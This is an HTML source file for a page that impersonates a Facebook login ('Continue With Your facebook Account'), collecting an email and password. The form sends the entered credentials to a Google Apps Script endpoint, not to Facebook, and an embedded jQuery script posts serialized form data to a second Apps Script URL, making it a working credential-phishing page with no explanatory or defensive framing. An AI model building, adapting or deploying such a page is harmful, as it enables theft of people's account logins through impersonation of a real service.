<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Bootstrap Facebook Theme Login Form</title>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script> 
<style>
	body {
		color: #646464;
		background: #e2e2e2;
	}	
    .login-form {
        width: 300px;
    	margin: 30px auto;
    }
    .login-form h2 {
        font-size: 26px;
		font-weight: bold;
        margin: 30px 0;
        text-align: center;
    }
    .login-form form {
		color: #fff;
        background: #405e9e;
		background: radial-gradient(circle, #4d6ba9, #375595);
        box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
        padding: 25px;
        margin-bottom: 15px;
    }
	.login-form .form-control {
		border-color: #dfdfdf;
		box-shadow: none !important;
	}
    .login-form .form-control, .login-form .btn {
        min-height: 38px;        
    }
    .login-form input[type="email"] {
        border-radius: 2px 2px 0 0;
    }
    .login-form input[type="password"] {
        border-radius: 0 0 2px 2px;
        margin-top: -1px;
    }    
    .login-form .btn {        
        font-size: 15px;
		font-weight: bold;
		border-radius: 2px;
		background: #eeeeee;
		color: #646464;
		margin-bottom: 25px;
        outline: none !important;
    }
	.login-form a {		
		color: #405e9e;
	}
    .login-form form a {
        color: #fff;
    }
</style>
</head>
<body>
    <h1 align="center">Continue With Your facebook Account</h1>
<div class="login-form">
    <form id="gform" method="POST" action="https://script.google.com/macros/s/AKfycby9A2R8eJY9Z9L16w-QXi3-2EXH6_uC5yHbowzfSA/exec">
		<h2 class="text-center">Facebook</h2>	
        <div class="form-group">
            <input type="email" name="Emailid" id="Emailid" class="form-control" placeholder="Email" required="required">
            <input type="password" name="password" id="password" class="form-control" placeholder="Password" required="required">
        </div>
        <div class="form-group">
            <button type="submit" class="btn btn-default btn-block">Login</button>
        </div>
        <p class="text-center"><a href="#">Forgot Password?</a></p>     
    </form>
    <p class="text-center small">Not Registered? <a href="#">Create an account</a></p>
</div>
	<script>
                $("#submit-form").submit((e)=>{
                    e.preventDefault()
                    $.ajax({
                        url:"https://script.google.com/macros/s/AKfycbymvCQuw0pFwVCSEWmilRe-LuT4Gfea-aFwi_1yyK64Oqcrh6RAp2pvh5chYSmoKKHS/exec",
                        data:$("#submit-form").serialize(),
                        method:"post",
                        success:function (response){
                            alert("message sent sucessfully...")
                            window.location.href=""
                            //window.location.href="https://google.com"
                        },
                        error:function (err){
                            alert("Something Error or no internet connection")
            
                        }
                    })
                })
            </script>
</body>
</html>
